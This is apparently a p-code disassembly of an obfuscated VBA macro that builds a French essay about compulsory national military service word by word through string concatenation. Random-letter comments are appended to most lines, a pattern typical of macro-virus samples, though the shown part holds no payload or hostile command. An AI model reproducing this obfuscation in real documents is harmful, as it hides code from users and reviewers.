' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "effondre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "laisser"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "place"
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "corvées"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "inutiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ennui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "connu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	St d2 
' 	QuoteRem 0x0042 0x0006 " ndsmm"
' Line #174:
' 	LineCont 0x0004 33 00 00 00
' 	Ld d2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "National."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "Est-il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "possible"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "rester"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "loin"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	St d2 
' 	BoS 0x0000 
' 	Ld a4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "personne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "avec"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "vie,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "relations,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	St a4 
' 	QuoteRem 0x00EF 0x000C " cilrtcfovrf"
' Line #175:
' 	LineCont 0x0008 1E 00 00 00 51 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "amis,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "puis"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "reprendre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "comme"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "si"
' 	Add 
' 	St a4 
' 	BoS 0x0000 
' 	Ld a4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "rien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "était"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "passé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	St a4 
' 	QuoteRem 0x0060 0x0009 " zsjgsymu"
' Line #176:
' 	LitStr 0x0008 "Certains"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "diront"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "fait"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "partie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devoir"
' 	Add 
' 	St a3 
' 	QuoteRem 0x00C3 0x000D " ucqfrpwljnrr"
' Line #177:
' 	LineCont 0x0010 04 00 00 00 18 00 00 00 7F 00 00 00 8B 00 00 00
' 	Ld a3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "citoyen."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Mais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "servir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pays"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "c"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "abord"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "payer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a3 
' 	BoS 0x0000 
' 	Ld a3 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "impôts,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "participer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "frais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "sécurité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "sociale,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	St a3 
' 	QuoteRem 0x0034 0x000F " wourvarnitdjbw"
' Line #178:
' 	LineCont 0x002C 04 00 00 00 13 00 00 00 19 00 00 00 34 00 00 00 43 00 00 00 5D 00 00 00 88 00 00 00 8F 00 00 00 C3 00 00 00 D1 00 00 00 FB 00 00 00
' 	Ld a3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "allocations"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "chômage,"
' 	Add 
' 	St a3 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "retraites,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "etc."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "personnes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	St a2 
' 	BoS 0x0000 
' 	Ld a2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "travaillent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "payent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "cela,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "actuels"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "sursitaires"
' 	Add 
' 	St a2 
' 	BoS 0x0000 
' 	Ld a2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "font"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "partie."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Ils"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "utiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a2 
' 	BoS 0x0000 
' 	LitStr 0x0001 "à"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "nation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "cotisants"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "appelés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c2 
' 	BoS 0x0000 
' 	Ld c2 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "contingent."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c2 
' 	QuoteRem 0x00D7 0x0009 " zeuqjepb"
' Line #179:
' 	LitStr 0x0002 "Le"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "national"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "prétends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "aujourd"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "hui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "reprends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	St d1 
' 	QuoteRem 0x00D4 0x0009 " umezepka"
' Line #180:
' 	LineCont 0x000C 7C 00 00 00 91 00 00 00 93 00 00 00
' 	Ld d1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "cour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "normalement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "milieu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	Ld d1 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Travail."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "C"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "véritable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "utopisme"
' 	Add 
' 	St d1 
' 	QuoteRem 0x0017 0x000D " ctoeveklzkik"
' Line #181:
' 	LineCont 0x0004 09 00 00 00
' 	Ld d1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d1 
' 	QuoteRem 0x0020 0x000C " synfibocxxl"
' Line #182:
' 	LineCont 0x000C 0B 00 00 00 2C 00 00 00 49 00 00 00
' 	LitStr 0x0005 "bilan"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "se"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "résume"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "perte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c3 
' 	QuoteRem 0x000A 0x0009 " zwdnyhzu"
' Line #183:
' 	LineCont 0x0010 1B 00 00 00 2F 00 00 00 34 00 00 00 36 00 00 00
' 	Ld c3 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "temps:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "C"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "véritable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "catastrophe"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "financière,"
' 	Add 
' 	St c3 
' 	QuoteRem 0x0043 0x000D " ricnjcobhwwm"
' Line #184:
' 	LineCont 0x000C 02 00 00 00 12 00 00 00 48 00 00 00
' 	Ld c3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "matérielle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "morale"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "individu,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "aura"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "répercutions"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c3 
' 	QuoteRem 0x0019 0x0005 " iqaz"
' Line #185:
' 	Ld c3 
' 	LitStr 0x000C "regrettables"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "durables."
' 	Add 
' 	St c3 
' 	QuoteRem 0x0042 0x000E " qngahgxnldrnd"
' Line #186:
' 	LineCont 0x0010 10 00 00 00 12 00 00 00 25 00 00 00 35 00 00 00
' 	LitStr 0x0003 "Ils"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "environ"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "250"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "000"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "jeunes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "citoyens,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "sursitaires,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' 	QuoteRem 0x002D 0x000C " jdxtobabsnf"
' Line #187:
' 	LineCont 0x000C 0D 00 00 00 21 00 00 00 26 00 00 00
' 	Ld c1 
' 	LitStr 0x0009 "effectuer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "notre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "militaire."
' 	Add 
